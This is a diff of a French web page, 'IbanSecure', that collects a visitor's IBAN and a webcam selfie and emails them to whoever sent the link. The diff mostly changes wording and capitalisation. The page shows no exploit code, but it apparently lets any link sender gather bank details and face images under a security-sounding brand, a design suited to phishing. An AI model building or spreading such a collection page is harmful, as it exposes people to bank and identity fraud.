@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="IbanSecure simplifie la vérification d'identité en combinant votre IBAN et un selfie pour une authentification rapide et fiable. Complétez vos informations et vos données seront envoyées par mail à celui qui vous a envoyé le lien.">
-  <title>IbanSecure - Envoi d'iban sécurisé & Selfie</title>
+  <meta name="description" content="IbanSecure simplifie la vérification de la personne en combinant votre IBAN et un selfie pour une validation rapide et sécurisée. Complétez vos informations et vos données seront envoyées par e-mail à celui qui vous a transmis le lien.">
+  <title>IbanSecure - Envoi d'IBAN sécurisé & Selfie</title>
   <style>
     /* --- Réinitialisation & Variables --- */
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -357,8 +357,8 @@
   
   <!-- Section Hero (Style épuré) -->
   <section class="hero" id="hero">
-    <h2>Envoi d'iban sécurisé</h2>
-    <p>Simplifiez vos démarches en envoyant votre IBAN de manière sécurisée, accompagné de votre selfie pour confirmer votre identité.</p>
+    <h2>Envoi d'IBAN sécurisé</h2>
+    <p>Simplifiez vos démarches en envoyant votre IBAN de manière sécurisée, accompagné de votre selfie pour vérifier que vous êtes bien la personne concernée.</p>
     <button class="cta-btn" onclick="scrollToSection('verify')">Commencer</button>
   </section>
   
@@ -373,15 +373,15 @@
       <!-- Onglet Fonctionnalités -->
       <div id="tab1" class="tab active">
         <h3>Fonctionnalités d'IbanSecure</h3>
-        <p>Notre solution combine la vérification de votre IBAN et un selfie en temps réel pour authentifier votre identité en toute sécurité.</p>
+        <p>Notre solution combine la vérification de votre IBAN et un selfie en temps réel pour confirmer que vous êtes bien la personne concernée, en toute sécurité.</p>
         <div class="card-grid">
           <div class="card">
             <h4>Authentification instantanée</h4>
-            <p>Vérification rapide et fiable de votre identité.</p>
+            <p>Vérification rapide et fiable de la personne concernée.</p>
           </div>
           <div class="card">
             <h4>Réduction des fraudes</h4>
-            <p>Minimisez les risques de fraude grâce à notre double authentification.</p>
+            <p>Minimisez les risques de fraude grâce à notre double vérification.</p>
           </div>
           <div class="card">
             <h4>Intégration aisée</h4>
@@ -401,19 +401,19 @@
         <div class="use-case-grid">
           <div class="use-case-card">
             <h4>Ouverture de compte bancaire</h4>
-            <p>Accélérez l'inscription de vos clients grâce à une vérification rapide de leur identité.</p>
+            <p>Accélérez l'inscription de vos clients grâce à une vérification rapide de la personne concernée.</p>
           </div>
           <div class="use-case-card">
             <h4>Accès sécurisé aux services</h4>
-            <p>Renforcez la sécurité de vos plateformes en validant l'identité des utilisateurs.</p>
+            <p>Renforcez la sécurité de vos plateformes en validant que l'utilisateur est bien la personne qu'il prétend être.</p>
           </div>
           <div class="use-case-card">
             <h4>Transactions financières</h4>
-            <p>Garantissez des échanges sûrs en confirmant l’identité avant chaque opération.</p>
+            <p>Garantissez des échanges sûrs en confirmant que la personne effectuant la transaction est bien autorisée.</p>
           </div>
           <div class="use-case-card">
             <h4>Lutte contre la fraude</h4>
-            <p>Prévenez les usurpations d'identité avec un système de double authentification.</p>
+            <p>Prévenez les fraudes en vérifiant efficacement que la personne est bien celle qu'elle prétend être.</p>
           </div>
         </div>
       </div>
@@ -425,11 +425,11 @@
         <div class="card-grid">
           <div class="card">
             <h4>Rapidité</h4>
-            <p>Un processus de vérification en quelques minutes.</p>
+            <p>Un processus de vérification rapide de la personne en quelques minutes.</p>
           </div>
           <div class="card">
             <h4>Sécurité renforcée</h4>
-            <p>Double authentification pour une protection maximale.</p>
+            <p>Double vérification pour une protection maximale.</p>
           </div>
           <div class="card">
             <h4>Facilité d'utilisation</h4>
@@ -454,7 +454,7 @@
     <div class="timeline">
       <div class="timeline-item left">
         <h4>Étape 1 : Réception du lien</h4>
-        <p>Vous recevez un lien personnalisé vous invitant à compléter votre vérification.</p>
+        <p>Vous recevez un lien personnalisé vous invitant à compléter la vérification.</p>
       </div>
       <div class="timeline-item right">
         <h4>Étape 2 : Saisie de l'IBAN</h4>
@@ -471,10 +471,9 @@
     </div>
   </section>
   
-  <!-- Section Vérification (Formulaire) --->
+  <!-- Section Vérification (Formulaire) -->
   <section class="form-section" id="verify">
-    <!-- Titre du formulaire mis à jour -->
-    <h3>J'envoie mon iban</h3>
+    <h3>J'envoie mon IBAN</h3>
     <!-- Indication du destinataire des données -->
     <p style="text-align:center; font-size:16px; color: var(--primary-color);">
       Vos données seront envoyées à : <span id="recipientDisplay" style="font-weight:bold;"></span>
@@ -483,7 +482,7 @@
       <label for="iban">Votre IBAN :</label>
       <input type="text" id="iban" name="iban" placeholder="FR00 0000 0000 0000 0000 0000 000" required>
       
-      <!-- Section Caméra & Selfie --->
+      <!-- Section Caméra & Selfie -->
       <div id="cameraSection">
         <button type="button" id="startCamera">Démarrer la caméra</button>
         <video id="video" autoplay class="hidden"></video>
@@ -491,12 +490,12 @@
         <canvas id="canvas" class="hidden"></canvas>
       </div>
       
-      <!-- Section CGU Dépliable --->
+      <!-- Section CGU Dépliable -->
       <div class="cgu-container" id="cgu">
         <button type="button" class="toggle-cgu" onclick="toggleCGU()">Afficher les Conditions Générales d'Utilisation</button>
         <div class="cgu-content" id="cguContent">
           <p>En utilisant IbanSecure, vous acceptez de fournir des informations véridiques et de respecter les lois et règlements en vigueur. Nous nous réservons le droit de modifier ces conditions à tout moment. Il est de votre responsabilité de consulter régulièrement ces CGU.</p>
-          <p>Nous déclinons toute responsabilité quant aux erreurs ou omissions dans les informations fournies par l'utilisateur.</p>
+          <p>Nous déclinons toute responsabilité quant aux erreurs ou omissions dans les informations fournies.</p>
         </div>
         <label>
           <input type="checkbox" id="accept-cgu" required> J'accepte les Conditions Générales d'Utilisation
@@ -507,13 +506,13 @@
     </form>
   </section>
   
-  <!-- Footer / Contact --->
+  <!-- Footer / Contact -->
   <footer id="contact">
     <p>&copy; 2025 IbanSecure. Tous droits réservés.</p>
     <p>Contactez-nous : <a href="mailto:contact@ibansecure.com">contact@ibansecure.com</a></p>
   </footer>
   
-  <!-- JavaScript pour onglets, défilement, caméra & CGU --->
+  <!-- JavaScript pour onglets, défilement, caméra & CGU -->
   <script>
     // Fonction de défilement fluide vers une section
     function scrollToSection(sectionId) {
@@ -626,7 +625,7 @@
         SecureToken: "votre_secure_token", // Remplacez par votre token sécurisé
         To: recipientEmail,
         From: "expediteur@domaine.com",    // Remplacez par votre adresse d'expéditeur
-        Subject: "Envoi d'iban sécurisé & Selfie",
+        Subject: "Envoi d'IBAN sécurisé & Selfie",
         Body: emailBody
       }).then(
         message => {
